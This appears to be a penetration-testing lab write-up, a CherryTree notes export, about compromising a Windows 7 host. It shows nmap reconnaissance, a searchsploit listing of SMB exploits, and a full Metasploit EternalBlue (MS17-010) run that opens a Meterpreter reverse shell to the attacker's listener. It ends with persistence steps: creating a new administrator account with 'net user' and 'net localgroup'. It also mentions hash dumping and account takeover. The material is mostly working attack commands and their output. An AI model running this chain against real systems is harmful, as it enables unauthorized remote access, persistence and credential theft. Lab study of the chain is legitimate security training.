The first step anytime you've identified your target is recon and enumeration, so the below shows the service enumeration via standalone nmap, rather than nmap within the msfconsole. However the msfconsole built in nmap can also be used as well. 



<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node unique_id="1" master_id="0" name="Blue" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#62a0ea" ts_creation="1779499075" ts_lastsave="1779508455">
    <rich_text>IP address: 192.168.0.28


NMAP scan
C:\home\User&gt; nmap -sV -p- -A -T4 192.168.0.28
Starting Nmap 7.99 ( </rich_text>
    <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
    <rich_text> ) at 2026-05-22 22:37 -0500
Nmap scan report for 192.168.0.28
Host is up (0.00098s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
MAC Address: BC:24:11:00:E2:34 (Proxmox Server Solutions GmbH)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-22T23:39:14-04:00
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:00:e2:34 (Proxmox Server Solutions GmbH)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-23T03:39:14
|_  start_date: 2026-05-22T23:20:13
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   0.98 ms 192.168.0.28

OS and Service detection performed. Please report any incorrect results at </rich_text>
    <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
    <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 98.15 seconds
</rich_text>
    <node unique_id="2" master_id="0" name="reverse shell" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#e01b24" ts_creation="1779508455" ts_lastsave="1779511164">
      <rich_text>msf &gt; searchsploit smb
[*] exec: searchsploit smb

--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Apple Mac OSX - 'mount_smbfs' Local Stack Buffer Overflow                                                | osx/local/4759.c
ASUS ASMB8 iKVM 1.14.51 - Remote Code Execution (RCE)                                                    | hardware/local/52244.txt
CyberCop Scanner Smbgrind 5.5 - Buffer Overflow (PoC)                                                    | windows/dos/39452.txt
Dell EMC Networking PC5500 firmware versions 4.1.0.22 and  Cisco Sx / SMB - Information Disclosure       | hardware/remote/51248.py
Ethereal 0.x - Multiple iSNS / SMB / SNMP Protocol Dissector Vulnerabilities                             | linux/remote/24259.c
foomatic-gui python-foomatic 0.7.9.4 - 'pysmb.py' Arbitrary Shell Command Execution                      | multiple/remote/36013.txt
LedgerSMB1.0/1.1 / SQL-Ledger 2.6.x - 'Login' Local File Inclusion / Authentication Bypass               | cgi/webapps/29761.txt
Links 1.00pre12 - 'smbclient' Remote Code Execution                                                      | multiple/remote/2784.html
Links_ ELinks 'smbclient' - Remote Command Execution                                                     | linux/remote/29033.html
Linux Kernel 2.6.x - SMBFS CHRoot Security Restriction Bypass                                            | linux/local/27766.txt
Linux pam_lib_smb &lt; 1.1.6 - '/bin/login' Remote Overflow                                                 | linux/remote/89.c
Microsoft - SMB Server Trans2 Zero Size Pool Alloc (MS10-054)                                            | windows/dos/14607.py
Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029) (Metasploit)          | windows/remote/16366.rb
Microsoft SMB Driver - Local Denial of Service                                                           | windows/dos/28001.c
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metas | windows/remote/43970.rb
Microsoft Windows - 'SMB' Transaction Response Handling (MS05-011)                                       | windows/dos/1065.c
Microsoft Windows - 'SMBGhost' Remote Code Execution                                                     | windows/remote/48537.py
Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                    | windows/remote/40280.py
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)             | windows/remote/14674.txt
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050) (Metasploit | windows/remote/16363.rb
Microsoft Windows - 'WRITE_ANDX' SMB Command Handling Kernel Denial of Service (Metasploit)              | windows/dos/6463.rb
Microsoft Windows - LSASS SMB NTLM Exchange Null-Pointer Dereference (MS16-137)                          | windows/dos/40744.txt
Microsoft Windows - SMB Client-Side Bug (PoC) (MS10-006)                                                 | windows/dos/12258.py
Microsoft Windows - SMB Relay Code Execution (MS08-068) (Metasploit)                                     | windows/remote/16360.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                            | windows/dos/41891.rb
Microsoft Windows - SMB2 Negotiate Protocol '0x72' Response Denial of Service                            | windows/dos/12524.py
Microsoft Windows - SmbRelay3 NTLM Replay (MS08-068)                                                     | windows/remote/7125.txt
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Buffer Overflow ( | windows/dos/48216.md
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Local Privilege E | windows/local/48267.txt
Microsoft Windows 10 - SMBv3 Tree Connect (PoC)                                                          | windows/dos/41222.py
Microsoft Windows 10.0.17134.648 - HTTP -&gt; SMB NTLM Reflection Leads to Privilege Elevation              | windows/local/47115.txt
Microsoft Windows 2000/XP - SMB Authentication Remote Overflow                                           | windows/remote/20.txt
Microsoft Windows 2003 SP2 - 'ERRATICGOPHER' SMB Remote Code Execution                                   | windows/remote/41929.py
Microsoft Windows 2003 SP2 - 'RRAS' SMB Remote Code Execution                                            | windows/remote/44616.py
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                         | windows/remote/42031.py
Microsoft Windows 7/2008 R2 - SMB Client Trans2 Stack Overflow (MS10-020) (PoC)                          | windows/dos/12273.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)     | windows/remote/42315.py
Microsoft Windows 8.1/2012 R2 - SMBv3 Null Pointer Dereference Denial of Service                         | windows/dos/44189.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)               | windows_x86-64/remote/42030.py
Microsoft Windows 95/Windows for Workgroups - 'smbclient' Directory Traversal                            | windows/remote/20371.txt
Microsoft Windows NT 4.0 SP5 / Terminal Server 4.0 - 'Pass the Hash' with Modified SMB Client            | windows/remote/19197.txt
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)            | windows_x86-64/remote/41987.py
Microsoft Windows SMB Server (v1/v2) - Mount Point Arbitrary Device Open Privilege Escalation            | windows/dos/43517.txt
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)     | windows/dos/9594.txt
Microsoft Windows XP/2000 - 'Mrxsmb.sys' Local Privilege Escalation (MS06-030)                           | windows/local/1911.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)                | windows/dos/21746.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)                | windows/dos/21747.txt
MikroTik RouterOS &lt; 6.41.3/6.42rc27 - SMB Buffer Overflow                                                | hardware/remote/44290.py
Netware - SMB Remote Stack Overflow (PoC)                                                                | novell/dos/13906.txt
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                        | multiple/dos/5712.pl
Samsung SyncThruWeb 2.01.00.26 - SMB Hash Disclosure                                                     | hardware/webapps/38004.txt
SmbClientParser 2.7 Perl Module - Remote Command Execution                                               | multiple/remote/32084.txt
smbftpd 0.96 - SMBDirList-function Remote Format String                                                  | linux/remote/4478.c
smbind 0.4.7 - SQL Injection                                                                             | php/webapps/14884.txt
SMBlog 1.2 - Arbitrary PHP Command Execution                                                             | php/webapps/27340.txt
SQL-Ledger 2.6.x/LedgerSMB 1.0 - 'Terminal' Directory Traversal                                          | cgi/webapps/28514.txt
VideoLAN VLC Client (Windows x86) - 'smb://' URI Buffer Overflow (Metasploit)                            | windows_x86/local/16678.rb
VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Buffer Overflow                          | windows/remote/9303.c
VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Universal Buffer Overflow                | windows/remote/9318.py
VideoLAN VLC Media Player 0.9.9 - 'smb://' URI Stack Buffer Overflow (PoC)                               | windows/dos/9029.rb
VideoLAN VLC Media Player 1.0.0/1.0.1 - 'smb://' URI Handling Buffer Overflow (PoC)                      | windows/dos/9427.py
VideoLAN VLC Media Player 1.0.2 - 'smb://' URI Stack Overflow                                            | windows/remote/9816.py
VideoLAN VLC Media Player 1.0.3 - 'smb://' URI Handling Remote Stack Overflow (PoC)                      | windows/dos/10333.py
VideoLAN VLC Media Player &lt; 1.1.4 - '.xspf smb://' URI Handling Remote Stack Overflow (PoC)              | windows/dos/14892.py
Visale 1.0 - 'pblsmb.cgi?listno' Cross-Site Scripting                                                    | cgi/webapps/27681.txt
Windows 11 SMB Client - Privilege Escalation &amp; Remote Code Execution (RCE)                               | windows/remote/52330.py
ZYXEL Router 3.40 Zynos - SMB Data Handling Denial of Service                                            | hardware/dos/29767.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
msf &gt; search EternalBlue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf &gt; use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) &gt; options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see </rich_text>
      <rich_text link="webs https://docs.metasploit.com/docs/using-metasploit/basics/using-metas">https://docs.metasploit.com/docs/using-metasploit/basics/using-metas</rich_text>
      <rich_text>
                                             ploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.219    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.0.28
rhost =&gt; 192.168.0.28
msf exploit(windows/smb/ms17_010_eternalblue) &gt; options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.0.28     yes       The target host(s), see </rich_text>
      <rich_text link="webs https://docs.metasploit.com/docs/using-metasploit/basics/using-metas">https://docs.metasploit.com/docs/using-metasploit/basics/using-metas</rich_text>
      <rich_text>
                                             ploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.219    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit
[*] Started reverse TCP handler on 192.168.0.219:4444 
[*] 192.168.0.28:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.0.28:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.26/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.0.28:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.0.28:445 - The target is vulnerable.
[*] 192.168.0.28:445 - Connecting to target for exploitation.
[+] 192.168.0.28:445 - Connection established for exploitation.
[+] 192.168.0.28:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.0.28:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.0.28:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.0.28:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.0.28:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.0.28:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.0.28:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.0.28:445 - Sending all but last fragment of exploit packet
[*] 192.168.0.28:445 - Starting non-paged pool grooming
[+] 192.168.0.28:445 - Sending SMBv2 buffers
[+] 192.168.0.28:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.0.28:445 - Sending final SMBv2 buffers.
[*] 192.168.0.28:445 - Sending last fragment of exploit packet!
[*] 192.168.0.28:445 - Receiving response from exploit packet
[+] 192.168.0.28:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.0.28:445 - Sending egg to corrupted connection.
[*] 192.168.0.28:445 - Triggering free of corrupted buffer.
[-] 192.168.0.28:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.0.28:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.0.28:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.0.28:445 - Connecting to target for exploitation.
[+] 192.168.0.28:445 - Connection established for exploitation.
[+] 192.168.0.28:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.0.28:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.0.28:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.0.28:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.0.28:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.0.28:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.0.28:445 - Trying exploit with 17 Groom Allocations.
[*] 192.168.0.28:445 - Sending all but last fragment of exploit packet
[*] 192.168.0.28:445 - Starting non-paged pool grooming
[+] 192.168.0.28:445 - Sending SMBv2 buffers
[+] 192.168.0.28:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.0.28:445 - Sending final SMBv2 buffers.
[*] 192.168.0.28:445 - Sending last fragment of exploit packet!
[*] 192.168.0.28:445 - Receiving response from exploit packet
[+] 192.168.0.28:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.0.28:445 - Sending egg to corrupted connection.
[*] 192.168.0.28:445 - Triggering free of corrupted buffer.
[*] Sending stage (248902 bytes) to 192.168.0.28
[*] Meterpreter session 1 opened (192.168.0.219:4444 -&gt; 192.168.0.28:49179) at 2026-05-22 22:53:14 -0500
[+] 192.168.0.28:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.28:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.28:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

- Once inside meterpreter shell after using eternal blue (CVE-2017-0144)
 the next step is creating persistence on the target machine

## create a new admin account and add the account to the local admin group

- net user &lt;username&gt; &lt;password&gt; /add
- net localgroup administrators &lt;username&gt; /add
   
   
   This then allows for persistence for later access via RDP or smb re-entry at a later date.
  Alternative to the actual account creation we could have also simply dumped the hash of the
  local user account we acquired shell access to and taken it through hashcat.
  From there we could have changed the local account admin password essentially performing account take over.

  
  
